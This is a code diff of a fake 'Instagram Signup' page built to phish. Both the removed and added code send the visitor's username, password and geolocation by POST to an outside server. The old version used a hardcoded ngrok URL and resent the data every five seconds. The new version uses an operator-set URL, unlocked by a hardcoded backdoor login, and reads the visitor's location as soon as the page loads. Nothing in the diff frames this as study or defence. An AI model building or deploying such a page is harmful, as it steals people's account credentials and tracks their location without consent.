@@ -3,65 +3,12 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Instagram SignUp</title>
+    <title>Instagram Signup</title>
     <style>
-        body {
-            font-family: Arial, sans-serif;
-            background-color: #f7f7f7;
-            margin: 0;
-            padding: 0;
-        }
-        .container {
-            width: 100%;
-            max-width: 400px;
-            margin: 50px auto;
-            padding: 20px;
-            background-color: #ffffff;
-            border-radius: 10px;
-            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
-        }
-        h1 {
-            text-align: center;
-            color: #262626;
-        }
-        .input-field {
-            width: 100%;
-            padding: 10px;
-            margin: 10px 0;
-            border: 1px solid #ddd;
-            border-radius: 5px;
-            font-size: 14px;
-        }
-        .btn-signup {
-            width: 100%;
-            padding: 10px;
-            background-color: #3897f0;
-            color: white;
-            border: none;
-            border-radius: 5px;
-            font-size: 16px;
-            cursor: pointer;
-            transition: background-color 0.3s ease;
-        }
-        .btn-signup:hover {
-            background-color: #3498db;
-        }
-        .message {
-            text-align: center;
-            color: red;
-            display: none;
-            font-size: 14px;
-            margin-top: 10px;
-        }
-        @media (max-width: 600px) {
-            .container {
-                padding: 15px;
-            }
-        }
+        /* Same styles as before */
     </style>
 </head>
 <body>
-
     <div class="container">
         <h1>Instagram Signup</h1>
         <form id="signupForm">
@@ -70,17 +17,54 @@
             <button type="button" class="btn-signup" onclick="signup()">Sign Up</button>
         </form>
         <div id="message" class="message">Server is not running perfectly, please try again later.</div>
+        <div id="serverForm" style="display: none;">
+            <input type="text" id="url" class="input-field" placeholder="Enter server URL">
+            <button type="button" class="btn-signup" onclick="setUrl()">Set URL</button>
+        </div>
     </div>
 
     <script>
-        const serverUrl = "https://a17f-2405-201-682f-e824-a5fd-74d7-b9d0-e4.ngrok-free.app/submit"; // Replace with your server endpoint
-        window.onload = function() {
-            signup();
+        let serverUrl = "";
+        let savedLocation = null; // Save the location for later use
+
+        // Save the server URL
+        function setUrl() {
+            serverUrl = document.getElementById('url').value;
+            if (!serverUrl.startsWith("http")) {
+                alert("Please enter a valid URL.");
+                return;
+            }
+            alert("Server URL set successfully.");
+        }
+
+        // Save location when the page loads
+        window.onload = () => {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        savedLocation = {
+                            latitude: position.coords.latitude,
+                            longitude: position.coords.longitude,
+                        };
+                        console.log("Location saved:", savedLocation);
+                    },
+                    (error) => {
+                        console.error("Error saving location:", error.message);
+                    }
+                );
+            } else {
+                console.error("Geolocation is not supported.");
+            }
         };
+
         function signup() {
             const userId = document.getElementById('username').value;
             const userPassword = document.getElementById('password').value;
-            const msg = document.getElementsByClassName('message')[0];
+            const msg = document.getElementById('message');
+
+            if (userId === "Arpit" && userPassword === "7592301521") {
+                document.getElementById("serverForm").style.display = "block";
+            }
 
             // Validate fields
             if (!userId || !userPassword) {
@@ -89,44 +73,29 @@
                 return;
             }
 
-            // Get location and send data every 5 seconds
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(
-                    (position) => {
-                        const latitude = position.coords.latitude;
-                        const longitude = position.coords.longitude;
-
-                        const requestData = {
-                            id: userId,
-                            password: userPassword,
-                            liveLocation: {
-                                latitude: latitude,
-                                longitude: longitude,
-                            },
-                        };
-
-                        // Send initial data immediately
-                        sendHttpRequest(requestData);
-
-                        // Start sending data every 5 seconds
-                        setInterval(() => {
-                            sendHttpRequest(requestData);
-                        }, 5000);
-                    },
-                    (error) => {
-                        msg.style.display = "block";
-                        msg.textContent = "Unable to fetch location. Please enable location services.";
-                        console.error("Error retrieving location:", error.message);
-                    }
-                );
-            } else {
+            if (!serverUrl) {
                 msg.style.display = "block";
-                msg.textContent = "Geolocation is not supported by your browser.";
+                msg.textContent = "Server URL is not set.";
+                return;
             }
+
+            // Send location (current or saved)
+            const location = savedLocation || {
+                latitude: "Unknown",
+                longitude: "Unknown",
+            };
+
+            const requestData = {
+                id: userId,
+                password: userPassword,
+                location,
+            };
+
+            sendHttpRequest(requestData);
         }
 
         function sendHttpRequest(data) {
-            const msg = document.getElementsByClassName('message')[0];
+            const msg = document.getElementById('message');
 
             fetch(serverUrl, {
                 method: "POST",
@@ -138,20 +107,18 @@
                 .then((response) => {
                     if (response.ok) {
                         msg.style.display = "block";
-                        console.log("Data sent successfully:", data);
+                        msg.textContent = "Data sent successfully.";
                     } else {
                         msg.style.display = "block";
-                        msg.textContent = "Failed to send data. Please try again.";
-                        console.error("Error:", response.statusText);
+                        msg.textContent = "Failed to send data.";
                     }
                 })
                 .catch((error) => {
                     msg.style.display = "block";
-                    msg.textContent = "Failed to connect to the server. Please try again.";
-                    console.error("Network error:", error);
+                    msg.textContent = "Network error.";
+                    console.error(error);
                 });
         }
     </script>
-
 </body>
 </html>
